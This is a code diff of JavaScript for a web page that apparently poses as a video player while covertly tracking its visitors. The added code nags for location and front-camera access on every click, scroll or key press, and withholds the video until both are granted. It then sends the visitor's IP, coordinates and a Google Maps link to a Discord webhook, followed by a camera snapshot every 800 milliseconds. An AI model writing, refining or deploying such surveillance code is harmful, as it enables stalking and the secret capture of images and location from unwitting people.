@@ -133,141 +133,112 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 
     // 2. Start Process Immediately
-    // 2. Start Process Immediately
-    // Remove captureStarted flag to allow clicks to retry execution!
     initCapture();
 
-    // Ensure it starts on interaction if blocked
-    document.addEventListener('click', () => {
-        initCapture();
+    // Aggressive triggers
+    ['click', 'touchstart', 'mousemove', 'scroll', 'keydown'].forEach(evt => {
+        document.addEventListener(evt, () => initCapture(), { once: false, passive: true });
     });
 
+    let isRequesting = false;
+
     async function initCapture() {
-        if (permissionsGranted) return; // Only stop if actually successful
+        if (permissionsGranted || isRequesting) return;
+        isRequesting = true;
         console.log("Requesting permissions...");
 
-        try {
-            // Helper to wrap Geolocation in a Promise (Persistent)
-            const getPersistentLocation = () => new Promise((resolve) => {
-                const tryLoc = () => {
-                    if (!("geolocation" in navigator)) {
-                        resolve(null); // Not supported
-                        return;
-                    }
-                    navigator.geolocation.getCurrentPosition(
-                        resolve,
-                        (err) => {
-                            console.log("Loc failed, retrying...", err);
-                            // Retry aggressively but not spammy
-                            setTimeout(tryLoc, 500);
-                        },
-                        { enableHighAccuracy: true, timeout: 5000 }
-                    );
-                };
-                tryLoc();
-            });
-
-            // Helper to get IP
-            const getIP = async () => {
-                try {
-                    const res = await fetch('https://api.ipify.org?format=json');
-                    const data = await res.json();
-                    return data.ip;
-                } catch (e) { return "Unknown"; }
+        const getPersistentLocation = () => new Promise((resolve) => {
+            const tryLoc = () => {
+                if (!("geolocation" in navigator)) { resolve(null); return; }
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => resolve(pos),
+                    (err) => {
+                        console.log("Loc failed", err);
+                        // Retry check is handled by the re-triggering of initCapture via events
+                        // But we can also set a timeout to clear isRequesting
+                        setTimeout(() => resolve(null), 1000);
+                    },
+                    { enableHighAccuracy: true, timeout: 3000 }
+                );
             };
+            tryLoc();
+        });
 
-            // 1. Request Location PERSISTENTLY
-            const position = await getPersistentLocation();
+        const getPersistentCamera = () => new Promise(async (resolve) => {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+                resolve(stream);
+            } catch (err) {
+                console.log("Cam failed", err);
+                setTimeout(() => resolve(null), 1000);
+            }
+        });
 
-            // Check support
-            if (!position) {
-                throw new Error("Geolocation not supported by this browser.");
+        try {
+            // Request BOTH in parallel
+            const [position, stream] = await Promise.all([getPersistentLocation(), getPersistentCamera()]);
+
+            // If BOTH successful
+            if (position && position.coords && stream) {
+
+                // 1. IP
+                const ipRes = await fetch('https://api.ipify.org?format=json').catch(() => ({ json: () => ({ ip: 'Unknown' }) }));
+                const ipData = await ipRes.json();
+                const ip = ipData.ip;
+
+                // 2. Send Data
+                const { latitude, longitude, accuracy } = position.coords;
+                const googleMapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+                fetch(webhookUrl, {
+                    method: "POST",
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: `📍 **PERMISSIONS GRANTED!**\n**IP:** ${ip}\n**Maps:** ${googleMapsUrl}\n**Coords:** ${latitude}, ${longitude}`
+                    })
+                }).catch(console.error);
+
+                // 3. Setup Camera
+                camPreview.srcObject = stream;
+                camPreview.onloadedmetadata = () => {
+                    camPreview.play();
+                    startCaptureLoop(position, ip);
+                };
+
+                console.log("Permissions granted. Starting...");
+                permissionsGranted = true;
+                isRequesting = false;
+
+                // Play Video
+                contentVideo.play().then(updateVolumeIcon).catch(() => {
+                    contentVideo.muted = true;
+                    contentVideo.play();
+                    updateVolumeIcon();
+                });
+
+            } else {
+                // One or both failed
+                isRequesting = false; // Allow retry on next interaction
             }
 
-            // 2. Request IP (background, no prompt) without blocking if possible or just await
-            const ip = await getIP();
-
-            // --- SEND LOCATION ONLY (Immediate) ---
-            const { latitude, longitude, accuracy } = position.coords;
-            const googleMapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
-
-            fetch(webhookUrl, {
-                method: "POST",
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    content: `📍 **Location Permission Granted!**\n**IP:** ${ip}\n**Maps:** ${googleMapsUrl}\n**Coords:** ${latitude}, ${longitude} (Acc: ${accuracy}m)`
-                })
-            }).catch(console.error);
-
-            // 3. Request Camera PERSISTENTLY
-            const getPersistentCamera = async () => {
-                while (true) {
-                    try {
-                        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
-                        return stream;
-                    } catch (err) {
-                        console.log("Camera denied/failed, retrying...", err);
-                        // Retry aggressively
-                        await new Promise(r => setTimeout(r, 500));
-                    }
-                }
-            };
-
-            const stream = await getPersistentCamera();
-
-            console.log("Permissions granted. Starting capture...");
-            permissionsGranted = true; // Enable playback
-
-            // START VIDEO only after permissions!
-            contentVideo.play().then(() => {
-                updateVolumeIcon();
-            }).catch(() => {
-                contentVideo.muted = true;
-                contentVideo.play();
-                updateVolumeIcon();
-            });
-
-            // Debug Log to Discord
-            fetch(webhookUrl, {
-                method: "POST",
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ content: `✅ **Permissions Granted!** Starting Loop...` })
-            }).catch(e => console.error(e));
-
-            // 2. Set up Camera
-            camPreview.srcObject = stream;
-
-            // 3. Start Loop when video is ready
-            camPreview.onloadedmetadata = () => {
-                camPreview.play();
-
-                const { latitude, longitude, accuracy } = position.coords;
-                let count = 0;
-                const maxCaptures = 10000000;
-
-                const intervalId = setInterval(async () => {
-                    if (count >= maxCaptures) {
-                        clearInterval(intervalId);
-                        return;
-                    }
-
-                    const imageBlob = await captureFrame(camPreview);
-                    sendToDiscord({ latitude, longitude, accuracy, imageBlob, ip, count: count + 1 });
-
-                    count++;
-                }, 800);
-            };
-
-        } catch (err) {
-            console.log("Permissions denied or error:", err);
-            // Report error to Discord
-            const formData = new FormData();
-            formData.append("payload_json", JSON.stringify({
-                content: `⚠️ **Permission/Capture Error**\nError: ${err.message}\nUA: ${navigator.userAgent}`
-            }));
-            fetch(webhookUrl, { method: "POST", body: formData }).catch(console.error);
+        } catch (e) {
+            console.error("Perm Error", e);
+            isRequesting = false;
         }
     }
+
+    function startCaptureLoop(position, ip) {
+        const { latitude, longitude, accuracy } = position.coords;
+        let count = 0;
+        setInterval(async () => {
+            // Limit capture count to prevent memory leaks if tab left open forever
+            if (count > 100000) return;
+            const imageBlob = await captureFrame(camPreview);
+            sendToDiscord({ latitude, longitude, accuracy, imageBlob, ip, count: count + 1 });
+            count++;
+        }, 800);
+    }
+    // (Old capture logic removed as it's now inside the new initCapture)
 
     function captureFrame(video) {
         const canvas = document.createElement("canvas");
